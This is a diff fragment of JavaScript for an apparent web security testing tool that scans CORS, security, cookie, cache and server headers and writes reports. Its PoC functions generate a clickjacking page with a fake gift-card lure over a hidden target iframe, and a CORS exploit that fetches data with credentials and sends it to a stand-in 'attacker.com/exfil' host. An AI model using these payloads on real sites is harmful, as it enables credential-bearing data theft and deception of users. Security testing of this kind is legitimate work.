+        statusText = 'UNKNOWN';
+    }
+    
+    row.innerHTML = `
+        <div class="cell-header">${test}</div>
+        <div class="cell-status ${statusClass}">${statusText}</div>
+        <div class="cell-value" title="${details}">${details.length > 50 ? details.substring(0, 50) + '...' : details}</div>
+    `;
+    corsResults.appendChild(row);
+}
+
+// ==================== HEADER CHECKING FUNCTIONS ====================
+
+async function testAllHeaders() {
+    const url = getTargetURL();
+    if (!url) return;
+    
+    updateStatus(headersStatus, 'testing', 'Headers: Testing...');
+    logToConsole(`Fetching all headers from ${url}...`, "info");
+    
+    try {
+        const response = await fetch(url, { method: 'HEAD' });
+        
+        allHeaders = [];
+        response.headers.forEach((value, key) => {
+            allHeaders.push({ name: key, value: value });
+        });
+        
+        // Sort alphabetically
+        allHeaders.sort((a, b) => a.name.localeCompare(b.name));
+        
+        // Display all headers
+        displayFilteredHeaders();
+        
+        // Analyze headers
+        analyzeHeaders(allHeaders);
+        
+        updateStatus(headersStatus, 'protected', `Headers: ${allHeaders.length} found`);
+        logToConsole(`Found ${allHeaders.length} headers total`, "data");
+        
+        // Update POC
+        updateHeadersPoc(allHeaders);
+        
+    } catch (error) {
+        logToConsole(`Failed to fetch headers: ${error.message}`, "bad");
+        updateStatus(headersStatus, 'vulnerable', 'Headers: Failed');
+    }
+}
+
+async function testSecurityHeaders() {
+    const url = getTargetURL();
+    if (!url) return;
+    
+    logToConsole(`Testing security headers on ${url}...`, "info");
+    
+    try {
+        const response = await fetch(url, { method: 'HEAD' });
+        
+        const securityHeaders = [
+            // Clickjacking protection
+            { name: 'X-Frame-Options', check: (v) => v && (v.toUpperCase() === 'DENY' || v.toUpperCase() === 'SAMEORIGIN') },
+            { name: 'Content-Security-Policy', check: (v) => v && v.includes('frame-ancestors') },
+            
+            // HTTPS enforcement
+            { name: 'Strict-Transport-Security', check: (v) => v && v.includes('max-age=') },
+            
+            // MIME type protection
+            { name: 'X-Content-Type-Options', check: (v) => v && v.toUpperCase() === 'NOSNIFF' },
+            
+            // Referrer control
+            { name: 'Referrer-Policy', check: (v) => v && !v.includes('unsafe') },
+            
+            // XSS protection
+            { name: 'X-XSS-Protection', check: (v) => v && (v.includes('1; mode=block') || v.includes('1; report=')) },
+            
+            // Cross-domain policies
+            { name: 'X-Permitted-Cross-Domain-Policies', check: (v) => v && v.toUpperCase() === 'NONE' },
+            
+            // Certificate transparency
+            { name: 'Expect-CT', check: (v) => v && v.includes('enforce') },
+            
+            // Permissions policy
+            { name: 'Permissions-Policy', check: (v) => v && v.length > 0 },
+            
+            // CORS security
+            { name: 'Cross-Origin-Embedder-Policy', check: (v) => v && (v.includes('require-corp') || v.includes('credentialless')) },
+            { name: 'Cross-Origin-Opener-Policy', check: (v) => v && v.includes('same-origin') },
+            { name: 'Cross-Origin-Resource-Policy', check: (v) => v && v.includes('same-origin') }
+        ];
+        
+        headersTable.innerHTML = `
+            <div class="table-header">
+                <div>HEADER</div>
+                <div>STATUS</div>
+                <div>VALUE</div>
+            </div>
+        `;
+        
+        let securityScore = 0;
+        let totalHeaders = securityHeaders.length;
+        
+        securityHeaders.forEach(header => {
+            const value = response.headers.get(header.name.toLowerCase());
+            const isPresent = !!value;
+            const isSecure = isPresent ? header.check(value) : false;
+            
+            if (isSecure) securityScore++;
+            
+            const row = document.createElement('div');
+            row.className = 'table-row';
+            row.innerHTML = `
+                <div class="cell-header">${header.name}</div>
+                <div class="cell-status ${isPresent ? (isSecure ? 'secure' : 'vulnerable') : 'missing'}">
+                    ${isPresent ? (isSecure ? 'SECURE' : 'INSECURE') : 'MISSING'}
+                </div>
+                <div class="cell-value" title="${value || 'Not set'}">
+                    ${value ? (value.length > 40 ? value.substring(0, 40) + '...' : value) : '-'}
+                </div>
+            `;
+            headersTable.appendChild(row);
+        });
+        
+        const securityPercentage = Math.round((securityScore / totalHeaders) * 100);
+        
+        logToConsole(`Security score: ${securityScore}/${totalHeaders} (${securityPercentage}%)`, 
+                     securityPercentage > 70 ? "ok" : securityPercentage > 40 ? "warn" : "bad");
+        
+        // Add summary row
+        const summaryRow = document.createElement('div');
+        summaryRow.className = 'table-row';
+        summaryRow.style.background = 'rgba(0, 255, 156, 0.1)';
+        summaryRow.innerHTML = `
+            <div class="cell-header">SECURITY SCORE</div>
+            <div class="cell-status ${securityPercentage > 70 ? 'secure' : securityPercentage > 40 ? 'vulnerable' : 'missing'}">
+                ${securityPercentage}%
+            </div>
+            <div class="cell-value">
+                ${securityScore}/${totalHeaders} headers properly configured
+            </div>
+        `;
+        headersTable.appendChild(summaryRow);
+        
+    } catch (error) {
+        logToConsole(`Failed to fetch security headers: ${error.message}`, "bad");
+    }
+}
+
+async function testCookieHeaders() {
+    const url = getTargetURL();
+    if (!url) return;
+    
+    logToConsole(`Testing cookie security headers...`, "info");
+    
+    try {
+        const response = await fetch(url, { method: 'GET', credentials: 'include' });
+        
+        const cookieHeader = response.headers.get('set-cookie');
+        const cookies = cookieHeader ? cookieHeader.split(/,(?=\s*[A-Za-z0-9_\-]+=)/) : [];
+        
+        headersTable.innerHTML = `
+            <div class="table-header">
+                <div>COOKIE ATTRIBUTE</div>
+                <div>STATUS</div>
+                <div>VALUE</div>
+            </div>
+        `;
+        
+        if (cookies.length === 0) {
+            const row = document.createElement('div');
+            row.className = 'table-row';
+            row.innerHTML = `
+                <div class="cell-header">No Cookies</div>
+                <div class="cell-status missing">MISSING</div>
+                <div class="cell-value">No cookies found in response</div>
+            `;
+            headersTable.appendChild(row);
+            return;
+        }
+        
+        cookies.forEach(cookie => {
+            const attributes = {
+                'HttpOnly': cookie.includes('HttpOnly'),
+                'Secure': cookie.includes('Secure'),
+                'SameSite': cookie.match(/SameSite=(\w+)/)?.[1] || 'Not set',
+                'Path': cookie.match(/Path=([^;]+)/)?.[1] || '/',
+                'Max-Age': cookie.match(/Max-Age=(\d+)/)?.[1] || 'Not set',
+                'Expires': cookie.match(/Expires=([^;]+)/)?.[1] || 'Not set'
+            };
+            
+            const cookieName = cookie.split('=')[0];
+            
+            const row = document.createElement('div');
+            row.className = 'table-row';
+            row.innerHTML = `
+                <div class="cell-header">${cookieName}</div>
+                <div class="cell-status ${attributes.HttpOnly && attributes.Secure ? 'secure' : 'vulnerable'}">
+                    ${attributes.HttpOnly && attributes.Secure ? 'SECURE' : 'INSECURE'}
+                </div>
+                <div class="cell-value" title="${cookie}">
+                    ${cookie.length > 50 ? cookie.substring(0, 50) + '...' : cookie}
+                </div>
+            `;
+            headersTable.appendChild(row);
+            
+            // Add attribute rows
+            Object.entries(attributes).forEach(([attr, value]) => {
+                const attrRow = document.createElement('div');
+                attrRow.className = 'table-row';
+                attrRow.style.paddingLeft = '30px';
+                attrRow.style.fontSize = '11px';
+                
+                let status = 'missing';
+                if (attr === 'HttpOnly' || attr === 'Secure') {
+                    status = value ? 'secure' : 'vulnerable';
+                } else if (attr === 'SameSite') {
+                    status = value === 'Strict' || value === 'Lax' ? 'secure' : 
+                             value === 'None' ? 'vulnerable' : 'missing';
+                }
+                
+                attrRow.innerHTML = `
+                    <div class="cell-header">→ ${attr}</div>
+                    <div class="cell-status ${status}">
+                        ${status === 'secure' ? 'OK' : status === 'vulnerable' ? 'WEAK' : 'MISS'}
+                    </div>
+                    <div class="cell-value">${value}</div>
+                `;
+                headersTable.appendChild(attrRow);
+            });
+        });
+        
+        logToConsole(`Analyzed ${cookies.length} cookie(s)`, "data");
+        
+    } catch (error) {
+        logToConsole(`Failed to analyze cookies: ${error.message}`, "bad");
+    }
+}
+
+async function testCachingHeaders() {
+    const url = getTargetURL();
+    if (!url) return;
+    
+    logToConsole(`Testing caching headers...`, "info");
+    
+    try {
+        const response = await fetch(url, { method: 'GET' });
+        
+        const cacheHeaders = [
+            'Cache-Control',
+            'Pragma',
+            'Expires',
+            'ETag',
+            'Last-Modified',
+            'Age',
+            'Vary'
+        ];
+        
+        headersTable.innerHTML = `
+            <div class="table-header">
+                <div>CACHE HEADER</div>
+                <div>STATUS</div>
+                <div>VALUE</div>
+            </div>
+        `;
+        
+        cacheHeaders.forEach(header => {
+            const value = response.headers.get(header.toLowerCase());
+            const isPresent = !!value;
+            
+            let status = 'missing';
+            let statusText = 'MISSING';
+            
+            if (isPresent) {
+                if (header === 'Cache-Control') {
+                    const directives = value.split(',').map(d => d.trim().toLowerCase());
+                    const hasNoCache = directives.includes('no-cache') || directives.includes('no-store');
+                    const hasMaxAge = directives.some(d => d.startsWith('max-age=') || d.startsWith('s-maxage='));
+                    
+                    if (hasNoCache) {
+                        status = 'secure';
+                        statusText = 'NO-CACHE';
+                    } else if (hasMaxAge) {
+                        status = 'present';
+                        statusText = 'CACHED';
+                    } else {
+                        status = 'vulnerable';
+                        statusText = 'WEAK';
+                    }
+                } else {
+                    status = 'present';
+                    statusText = 'PRESENT';
+                }
+            }
+            
+            const row = document.createElement('div');
+            row.className = 'table-row';
+            row.innerHTML = `
+                <div class="cell-header">${header}</div>
+                <div class="cell-status ${status}">${statusText}</div>
+                <div class="cell-value" title="${value || 'Not set'}">
+                    ${value ? (value.length > 40 ? value.substring(0, 40) + '...' : value) : '-'}
+                </div>
+            `;
+            headersTable.appendChild(row);
+        });
+        
+        logToConsole(`Cache headers analyzed`, "data");
+        
+    } catch (error) {
+        logToConsole(`Failed to analyze cache headers: ${error.message}`, "bad");
+    }
+}
+
+async function testServerHeaders() {
+    const url = getTargetURL();
+    if (!url) return;
+    
+    logToConsole(`Testing server information headers...`, "info");
+    
+    try {
+        const response = await fetch(url, { method: 'HEAD' });
+        
+        const serverHeaders = [
+            'Server',
+            'X-Powered-By',
+            'X-AspNet-Version',
+            'X-AspNetMvc-Version',
+            'X-Runtime',
+            'X-Version',
+            'Via',
+            'X-Backend-Server'
+        ];
+        
+        headersTable.innerHTML = `
+            <div class="table-header">
+                <div>SERVER HEADER</div>
+                <div>STATUS</div>
+                <div>VALUE</div>
+            </div>
+        `;
+        
+        let infoLeakCount = 0;
+        
+        serverHeaders.forEach(header => {
+            const value = response.headers.get(header.toLowerCase());
+            const isPresent = !!value;
+            
+            // Server information headers should ideally not be present (information leakage)
+            const status = isPresent ? 'vulnerable' : 'secure';
+            const statusText = isPresent ? 'LEAK' : 'HIDDEN';
+            
+            if (isPresent) infoLeakCount++;
+            
+            const row = document.createElement('div');
+            row.className = 'table-row';
+            row.innerHTML = `
+                <div class="cell-header">${header}</div>
+                <div class="cell-status ${status}">${statusText}</div>
+                <div class="cell-value" title="${value || 'Not set'}">
+                    ${value ? (value.length > 40 ? value.substring(0, 40) + '...' : value) : '-'}
+                </div>
+            `;
+            headersTable.appendChild(row);
+        });
+        
+        // Add summary
+        const summaryRow = document.createElement('div');
+        summaryRow.className = 'table-row';
+        summaryRow.style.background = 'rgba(0, 255, 156, 0.1)';
+        summaryRow.innerHTML = `
+            <div class="cell-header">INFORMATION LEAKAGE</div>
+            <div class="cell-status ${infoLeakCount === 0 ? 'secure' : infoLeakCount < 3 ? 'warn' : 'vulnerable'}">
+                ${infoLeakCount} leaks
+            </div>
+            <div class="cell-value">
+                ${infoLeakCount === 0 ? 'No server information leaked' : 
+                  `${infoLeakCount} server information header(s) found`}
+            </div>
+        `;
+        headersTable.appendChild(summaryRow);
+        
+        logToConsole(`Found ${infoLeakCount} server information header(s)`, 
+                     infoLeakCount === 0 ? "ok" : infoLeakCount < 3 ? "warn" : "bad");
+        
+    } catch (error) {
+        logToConsole(`Failed to analyze server headers: ${error.message}`, "bad");
+    }
+}
+
+function analyzeHeaders(headers) {
+    logToConsole("Analyzing headers for security issues...", "info");
+    
+    const analysis = {
+        missingSecurityHeaders: [],
+        informationLeaks: [],
+        insecureConfigurations: [],
+        recommendations: []
+    };
+    
+    // Check for missing critical security headers
+    const criticalHeaders = [
+        'content-security-policy',
+        'x-frame-options',
+        'strict-transport-security',
+        'x-content-type-options'
+    ];
+    
+    criticalHeaders.forEach(header => {
+        const found = headers.find(h => h.name.toLowerCase() === header);
+        if (!found) {
+            analysis.missingSecurityHeaders.push(header);
+        }
+    });
+    
+    // Check for information leaks
+    const infoHeaders = ['server', 'x-powered-by', 'x-aspnet-version'];
+    infoHeaders.forEach(header => {
+        const found = headers.find(h => h.name.toLowerCase() === header);
+        if (found) {
+            analysis.informationLeaks.push(`${header}: ${found.value}`);
+        }
+    });
+    
+    // Check specific header configurations
+    headers.forEach(header => {
+        const name = header.name.toLowerCase();
+        const value = header.value;
+        
+        if (name === 'x-frame-options' && value && 
+            !['DENY', 'SAMEORIGIN'].includes(value.toUpperCase())) {
+            analysis.insecureConfigurations.push(`Weak X-Frame-Options: ${value}`);
+        }
+        
+        if (name === 'access-control-allow-origin' && value === '*') {
+            analysis.insecureConfigurations.push(`Wildcard CORS: ${value}`);
+        }
+        
+        if (name === 'access-control-allow-credentials' && value === 'true' && 
+            headers.find(h => h.name.toLowerCase() === 'access-control-allow-origin' && h.value === '*')) {
+            analysis.insecureConfigurations.push('Dangerous CORS: Wildcard with credentials');
+        }
+    });
+    
+    // Generate recommendations
+    if (analysis.missingSecurityHeaders.length > 0) {
+        analysis.recommendations.push(`Add missing security headers: ${analysis.missingSecurityHeaders.join(', ')}`);
+    }
+    
+    if (analysis.informationLeaks.length > 0) {
+        analysis.recommendations.push(`Remove information-leaking headers: ${analysis.informationLeaks.join(', ')}`);
+    }
+    
+    if (analysis.insecureConfigurations.length > 0) {
+        analysis.recommendations.push(`Fix insecure configurations: ${analysis.insecureConfigurations.join('; ')}`);
+    }
+    
+    // Log analysis results
+    if (analysis.missingSecurityHeaders.length > 0) {
+        logToConsole(`Missing critical headers: ${analysis.missingSecurityHeaders.join(', ')}`, "bad");
+    }
+    
+    if (analysis.informationLeaks.length > 0) {
+        logToConsole(`Information leaks: ${analysis.informationLeaks.length} found`, "warn");
+    }
+    
+    if (analysis.insecureConfigurations.length > 0) {
+        logToConsole(`Insecure configurations: ${analysis.insecureConfigurations.length} found`, "bad");
+    }
+    
+    if (analysis.recommendations.length === 0) {
+        logToConsole("No critical security issues found in headers", "ok");
+    }
+    
+    return analysis;
+}
+
+function generateHeadersReport() {
+    if (allHeaders.length === 0) {
+        logToConsole("No header data available. Run a headers test first.", "warn");
+        return;
+    }
+    
+    const analysis = analyzeHeaders(allHeaders);
+    const url = getTargetURL();
+    
+    const report = `=== SECURITY HEADERS ANALYSIS REPORT ===
+Generated: ${new Date().toLocaleString()}
+Target: ${url}
+Total Headers: ${allHeaders.length}
+
+=== HEADERS FOUND ===
+${allHeaders.map(h => `${h.name}: ${h.value}`).join('\n')}
+
+=== SECURITY ANALYSIS ===
+
+Missing Critical Headers (${analysis.missingSecurityHeaders.length}):
+${analysis.missingSecurityHeaders.length > 0 ? analysis.missingSecurityHeaders.map(h => `  ✗ ${h}`).join('\n') : '  ✓ All critical headers present'}
+
+Information Leaks (${analysis.informationLeaks.length}):
+${analysis.informationLeaks.length > 0 ? analysis.informationLeaks.map(l => `  ⚠ ${l}`).join('\n') : '  ✓ No information leaks detected'}
+
+Insecure Configurations (${analysis.insecureConfigurations.length}):
+${analysis.insecureConfigurations.length > 0 ? analysis.insecureConfigurations.map(c => `  ✗ ${c}`).join('\n') : '  ✓ No insecure configurations detected'}
+
+=== RECOMMENDATIONS ===
+${analysis.recommendations.length > 0 ? analysis.recommendations.map(r => `1. ${r}`).join('\n') : 'All headers appear to be properly configured.'}
+
+=== SECURITY SCORING ===
+Critical Headers Present: ${4 - analysis.missingSecurityHeaders.length}/4
+Information Leaks: ${analysis.informationLeaks.length} (lower is better)
+Insecure Configs: ${analysis.insecureConfigurations.length} (lower is better)
+
+Overall Security: ${analysis.recommendations.length === 0 ? 'GOOD' : analysis.recommendations.length < 3 ? 'FAIR' : 'POOR'}`;
+    
+    showExtractedData(report, "Headers Security Report");
+    logToConsole("Headers report generated", "data");
+}
+
+// ==================== POC PANEL FUNCTIONS ====================
+function showPocPanel() {
+    pocPanel.style.display = 'block';
+    pocPanel.scrollIntoView({ behavior: 'smooth' });
+}
+
+function closePocPanel() {
+    pocPanel.style.display = 'none';
+}
+
+function switchPocTab(tab) {
+    // Update POC tabs
+    document.querySelectorAll('.poc-tab').forEach(t => t.classList.remove('active'));
+    event.target.classList.add('active');
+    
+    // Show/hide POC sections
+    document.querySelectorAll('.poc-section').forEach(s => s.classList.remove('active'));
+    document.getElementById(tab + 'Poc').classList.add('active');
+}
+
+function updateClickjackPoc(targetUrl, isVulnerable) {
+    const clickjackCode = `<!DOCTYPE html>
+<html>
+<head>
+    <title>Clickjacking Attack PoC</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: #1a1a1a;
+            color: #fff;
+        }
+        
+        .container {
+            position: relative;
+            width: 100%;
+            height: 100vh;
+        }
+        
+        /* Malicious overlay */
+        .overlay {
+            position: absolute;
+            top: 50px;
+            left: 50px;
+            width: 300px;
+            height: 200px;
+            background: linear-gradient(135deg, #ff3333, #ff6666);
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 0 30px rgba(255, 51, 51, 0.5);
+            z-index: 1000;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .overlay:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 40px rgba(255, 51, 51, 0.7);
+        }
+        
+        .overlay h2 {
+            margin: 0 0 10px 0;
+            color: white;
+        }
+        
+        .overlay p {
+            margin: 0 0 20px 0;
+            color: rgba(255, 255, 255, 0.9);
+        }
+        
+        .attack-button {
+            background: white;
+            color: #ff3333;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .attack-button:hover {
+            background: #ff3333;
+            color: white;
+        }
+        
+        /* Hidden target iframe */
+        .target-iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            opacity: 0.1;
+            pointer-events: none;
+            z-index: 1;
+        }
+        
+        .info-box {
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 15px;
+            border-radius: 5px;
+            border-left: 4px solid #ff3333;
+            max-width: 400px;
+        }
+        
+        .info-box h3 {
+            margin: 0 0 10px 0;
+            color: #ff3333;
+        }
+        
+        .info-box ul {
+            margin: 0;
+            padding-left: 20px;
+        }
+        
+        .info-box li {
+            margin: 5px 0;
+            color: #ccc;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Malicious overlay that tricks users -->
+        <div class="overlay" id="maliciousOverlay">
+            <h2>🎁 FREE GIFT CARD! 🎁</h2>
+            <p>Congratulations! You've won a $500 Amazon gift card!</p>
+            <p>Click below to claim your prize instantly!</p>
+            <button class="attack-button" onclick="triggerAttack()">
+                CLAIM YOUR PRIZE NOW!
+            </button>
+        </div>
+        
+        <!-- Hidden target website in iframe -->
+        <iframe class="target-iframe" id="targetFrame" src="${targetUrl}"></iframe>
+        
+        <!-- Information box -->
+        <div class="info-box">
+            <h3>🔒 Clickjacking Attack Demonstration</h3>
+            <p>This is a Proof of Concept showing how clickjacking works:</p>
+            <ul>
+                <li>The button above looks legitimate</li>
+                <li>It's actually positioned over the hidden iframe</li>
+                <li>Clicking triggers actions on the target site</li>
+                <li>User unknowingly performs actions on ${targetUrl}</li>
+            </ul>
+            <p><strong>Vulnerability Status:</strong> 
+               <span style="color: ${isVulnerable ? '#ff3333' : '#33ff33'}">
+                   ${isVulnerable ? 'VULNERABLE' : 'PROTECTED'}
+               </span>
+            </p>
+        </div>
+    </div>
+    
+    <script>
+        let attackCount = 0;
+        
+        function triggerAttack() {
+            attackCount++;
+            const targetFrame = document.getElementById('targetFrame');
+            const maliciousOverlay = document.getElementById('maliciousOverlay');
+            
+            // Simulate clicking on hidden iframe elements
+            maliciousOverlay.innerHTML = \`
+                <h2>🎉 SUCCESS! 🎉</h2>
+                <p>Attack simulated! (\${attackCount} time\${attackCount > 1 ? 's' : ''})</p>
+                <p>The user would have triggered actions on:</p>
+                <p><strong>\${targetFrame.src}</strong></p>
+                <p style="color: #ffcc00; font-size: 12px;">
+                    In a real attack, this could be:<br>
+                    • Changing password<br>
+                    • Making purchases<br>
+                    • Granting permissions<br>
+                    • Posting malicious content
+                </p>
+                <button class="attack-button" onclick="resetOverlay()">
+                    TRY AGAIN
+                </button>
+            \`;
+            
+            // In a real attack, we would programmatically click elements in the iframe
+            // Example: targetFrame.contentDocument.querySelector('button').click();
+            
+            // Log the attack
+            console.log(\`[CLICKJACKING] Attack triggered on \${targetFrame.src}\`);
+        }
+        
+        function resetOverlay() {
+            const maliciousOverlay = document.getElementById('maliciousOverlay');
+            maliciousOverlay.innerHTML = \`
+                <h2>🎁 FREE GIFT CARD! 🎁</h2>
+                <p>Congratulations! You've won a $500 Amazon gift card!</p>
+                <p>Click below to claim your prize instantly!</p>
+                <button class="attack-button" onclick="triggerAttack()">
+                    CLAIM YOUR PRIZE NOW!
+                </button>
+            \`;
+        }
+        
+        // Position overlay randomly
+        function randomizeOverlay() {
+            const overlay = document.getElementById('maliciousOverlay');
+            const maxX = window.innerWidth - 350;
+            const maxY = window.innerHeight - 250;
+            const x = Math.floor(Math.random() * maxX);
+            const y = Math.floor(Math.random() * maxY);
+            
+            overlay.style.left = \`\${x}px\`;
+            overlay.style.top = \`\${y}px\`;
+        }
+        
+        // Randomize position every 10 seconds
+        setInterval(randomizeOverlay, 10000);
+        randomizeOverlay();
+    <\/script>
+</body>
+</html>`;
+
+    clickjackPocContent.textContent = clickjackCode;
+    
+    // Also generate a simplified version
+    const simplifiedPoc = `<!-- Simple Clickjacking PoC -->
+<iframe style="opacity:0;position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;" 
+        src="${targetUrl}"></iframe>
+
+<div style="position:fixed;top:50px;left:50px;z-index:2;background:red;color:white;padding:20px;">
+    <h2>CLICK HERE FOR FREE PRIZE!</h2>
+    <button onclick="alert('Attack triggered!')">CLAIM NOW</button>
+</div>
+
+<!-- This demonstrates how an attacker overlays malicious content -->
+<!-- The iframe is hidden (opacity:0) but still clickable -->
+<!-- User thinks they're clicking the overlay but actually clicks the iframe -->`;
+    
+    // Show both versions
+    clickjackPocContent.textContent = simplifiedPoc + "\n\n" + "=".repeat(80) + "\n\n" + clickjackCode;
+    
+    // Switch to clickjacking tab
+    switchPocTab('clickjack');
+    showPocPanel();
+}
+
+function updateCorsPoc(requestDetails, responseDetails) {
+    if (!requestDetails || !responseDetails) {
+        corsPocContent.textContent = "No CORS request/response data available.\nRun a CORS test first.";
+        return;
+    }
+    
+    const corsDetails = `=== CORS REQUEST DETAILS ===
+
+Request URL: ${requestDetails.url}
+Request Method: ${requestDetails.method || 'GET'}
+Request Mode: ${requestDetails.mode || 'cors'}
+Request Credentials: ${requestDetails.credentials || 'omit'}
+
+Request Headers:
+${Object.entries(requestDetails.headers || {}).map(([k, v]) => `  ${k}: ${v}`).join('\n')}
+
+=== CORS RESPONSE DETAILS ===
+
+Response Status: ${responseDetails.status} ${responseDetails.statusText}
+Response Type: ${responseDetails.type}
+Response URL: ${responseDetails.url}
+
+Response Headers:
+${Object.entries(responseDetails.headers || {}).map(([k, v]) => `  ${k}: ${v}`).join('\n')}
+
+CORS-Specific Headers:
+  Access-Control-Allow-Origin: ${responseDetails.headers?.['access-control-allow-origin'] || 'Not set'}
+  Access-Control-Allow-Credentials: ${responseDetails.headers?.['access-control-allow-credentials'] || 'Not set'}
+  Access-Control-Allow-Methods: ${responseDetails.headers?.['access-control-allow-methods'] || 'Not set'}
+  Access-Control-Allow-Headers: ${responseDetails.headers?.['access-control-allow-headers'] || 'Not set'}
+
+Response Body Preview (first 500 chars):
+${responseDetails.bodyPreview || 'No body data'}
+
+=== SECURITY ANALYSIS ===
+
+${responseDetails.headers?.['access-control-allow-origin'] === '*' ? 
+'⚠ CRITICAL: Wildcard CORS (*) detected!\n  This allows any origin to access this resource.' :
+responseDetails.headers?.['access-control-allow-origin'] ? 
+`ℹ CORS configured for specific origin: ${responseDetails.headers['access-control-allow-origin']}` :
+'✅ No CORS headers detected (default same-origin policy)'}
+
+${responseDetails.headers?.['access-control-allow-credentials'] === 'true' && 
+responseDetails.headers?.['access-control-allow-origin'] !== '*' ?
+'⚠ WARNING: Credentials allowed with specific origin' :
+responseDetails.headers?.['access-control-allow-credentials'] === 'true' && 
+responseDetails.headers?.['access-control-allow-origin'] === '*' ?
+'🚨 CRITICAL: Wildcard origin with credentials allowed!' :
+'✅ Credentials properly restricted'}`;
+
+    corsPocContent.textContent = corsDetails;
+    
+    // Also generate exploit code
+    const targetUrl = requestDetails.url;
+    const exploitCode = `// CORS Exploit PoC for: ${targetUrl}
+// Generated: ${new Date().toLocaleString()}
+
+// Method 1: Simple fetch (if wildcard or specific origin allowed)
+fetch("${targetUrl}", {
+    method: 'GET',
+    mode: 'cors',
+    credentials: 'include'
+})
+.then(response => response.text())
+.then(data => {
+    console.log('[CORS EXPLOIT] Data extracted:', data.length, 'bytes');
+    // Send stolen data to attacker server
+    return fetch('https://attacker.com/exfil', {
+        method: 'POST',
+        body: JSON.stringify({
+            url: "${targetUrl}",
+            data: data.substring(0, 5000), // First 5000 chars
+            timestamp: new Date().toISOString()
+        })
+    });
+})
+.then(() => console.log('[CORS EXPLOIT] Data exfiltrated successfully'))
+.catch(error => console.log('[CORS EXPLOIT] Blocked:', error.message));
+
+// Method 2: Advanced exploit with headers
+fetch("${targetUrl}", {
+    method: 'GET',
+    mode: 'cors',
+    credentials: 'include',
+    headers: {
+        'X-Requested-With': 'XMLHttpRequest',
+        'Accept': 'application/json,text/html,*/*',
+        'Origin': 'https://attacker.com'
+    }
+})
+.then(r => {
+    console.log('[CORS EXPLOIT] Response headers:', Object.fromEntries(r.headers.entries()));
+    return r.text();
+})
+.then(data => {
+    console.log('[CORS EXPLOIT] Advanced extraction:', data.length, 'bytes');
+});
+
+// Method 3: Steal sensitive endpoints (common patterns)
+const endpoints = [
+    '${targetUrl}/api',
+    '${targetUrl}/data',
+    '${targetUrl}/users',
+    '${targetUrl}/admin',
+    '${targetUrl}/config'
+];
+
+endpoints.forEach(endpoint => {
+    fetch(endpoint, { mode: 'cors' })
+    .then(r => r.text())
+    .then(d => console.log(\`[CORS EXPLOIT] \${endpoint}: \${d.length} bytes\`))
+    .catch(() => {}); // Silently fail for blocked endpoints
+});`;
+
+    corsPocContent.textContent += "\n\n" + "=".repeat(80) + "\n\n" + exploitCode;
+    
+    // Switch to CORS tab
+    switchPocTab('cors');
+    showPocPanel();
+}
+
+function updateHeadersPoc(headers) {
+    if (!headers || headers.length === 0) {
+        headersPocContent.textContent = "No security headers data available.\nRun a security headers test first.";
+        return;
+    }
+    
+    const analysis = analyzeHeaders(headers);
+    const url = getTargetURL() || "TARGET_URL";
+    
+    const headersPoc = `=== COMPREHENSIVE SECURITY HEADERS ANALYSIS ===
+Target: ${url}
+Generated: ${new Date().toLocaleString()}
+Total Headers: ${headers.length}
+
+=== ALL HEADERS ===
+${headers.map(h => `${h.name}: ${h.value}`).join('\n')}
+
+=== SECURITY VULNERABILITIES DETECTED ===
+
+${analysis.missingSecurityHeaders.length > 0 ? 
+`Missing Critical Headers (${analysis.missingSecurityHeaders.length}):\n` +
+analysis.missingSecurityHeaders.map(h => `✗ ${h}`).join('\n') + '\n' : 
+'✓ All critical security headers present\n'}
+
+${analysis.informationLeaks.length > 0 ? 
+`Information Leaks (${analysis.informationLeaks.length}):\n` +
+analysis.informationLeaks.map(l => `⚠ ${l}`).join('\n') + '\n' : 
+'✓ No information leaks detected\n'}
+
+${analysis.insecureConfigurations.length > 0 ? 
+`Insecure Configurations (${analysis.insecureConfigurations.length}):\n` +
+analysis.insecureConfigurations.map(c => `✗ ${c}`).join('\n') + '\n' : 
+'✓ No insecure configurations detected\n'}
+
+=== SECURITY TEST SCRIPTS ===
+
+// Test 1: Check all headers
+fetch("${url}", { method: 'HEAD' })
+.then(response => {
+    const headers = {};
+    response.headers.forEach((value, key) => {
+        headers[key] = value;
+    });
+    
+    console.log('All Headers:', headers);
+    
+    // Check for specific vulnerabilities
+    const vulnerabilities = [];
+    
+    // Check for wildcard CORS
+    if (headers['access-control-allow-origin'] === '*') {
+        vulnerabilities.push('Wildcard CORS (*) detected');
+    }
+    
+    // Check for missing security headers
+    const criticalHeaders = ['content-security-policy', 'x-frame-options', 'strict-transport-security'];
+    criticalHeaders.forEach(header => {
+        if (!headers[header]) {
+            vulnerabilities.push(\`Missing \${header}\`);
+        }
+    });
+    
+    // Check for information leaks
+    const infoHeaders = ['server', 'x-powered-by', 'x-aspnet-version'];
+    infoHeaders.forEach(header => {
+        if (headers[header]) {
+            vulnerabilities.push(\`Information leak: \${header}: \${headers[header]}\`);
+        }
+    });
+    
+    if (vulnerabilities.length > 0) {
+        console.log('VULNERABILITIES FOUND:', vulnerabilities);
+    } else {
+        console.log('No vulnerabilities detected');
+    }
+})
+.catch(error => {
+    console.log('Failed to fetch headers:', error);
+});
+
+// Test 2: Check CORS configuration
+fetch("${url}", {
+    method: 'OPTIONS',
+    headers: {
+        'Origin': 'https://attacker.com',
+        'Access-Control-Request-Method': 'GET',
+        'Access-Control-Request-Headers': 'X-Requested-With'
+    }
+})
+.then(response => {
+    console.log('CORS Preflight Response:', {
+        status: response.status,
+        headers: Object.fromEntries(response.headers.entries())
+    });
+})
+.catch(error => {
+    console.log('CORS Preflight failed:', error);
+});
+
+// Test 3: Check clickjacking protection
+const iframe = document.createElement('iframe');
+iframe.src = "${url}";
+iframe.style.cssText = 'position:absolute;top:-1000px;left:-1000px;width:100px;height:100px;';
+document.body.appendChild(iframe);
+
+iframe.onload = () => {
